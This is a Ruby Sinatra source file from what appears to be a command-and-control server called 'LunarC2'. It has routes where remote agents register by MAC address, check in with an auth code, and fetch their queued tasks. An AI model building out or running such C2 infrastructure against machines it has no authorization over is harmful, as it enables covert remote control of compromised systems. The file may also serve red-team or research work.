module Sinatra
	module LunarC2
		module Routing
			module C2
				def self.registered(app) 

					app.post '/c2/initial' do
						@secret = ""
						if not @agent = Agent.first(mac: params[:mac])
							@secret = SecureRandom.uuid
							@agent = Agent.create(mac: params[:mac], 
											last_ip: params[:ip], 
											auth_code: @secret)
						end
						jbuilder :initial_json
					end	

					app.post '/c2/checkin/:id' do
						@agent = Agent.first(id: params[:id])
						if @agent.nil? or not @agent.authenticate(params[:auth_code])
							@path = request.path_info
							jbuilder :error_json
						else
							@task_cnt = Task.count( open: true, agent: @agent )
							jbuilder :checkin_json
						end
					end

					app.post '/c2/tasking/:id' do
						@agent = Agent.first(id: params[:id])
						if @agent.nil? or not @agent.authenticate(params[:auth_code])
							@path = request.path_info
							jbuilder :error_json
						else
							@tasks = Task.all( open: true, agent: @agent )
							@tasks.each do |task|
								task.open = false
								task.save
							end
							jbuilder :tasking_json
						end

					end

					app.post '/c2/update/:id' do

					end

				end
			end
		end
	end
end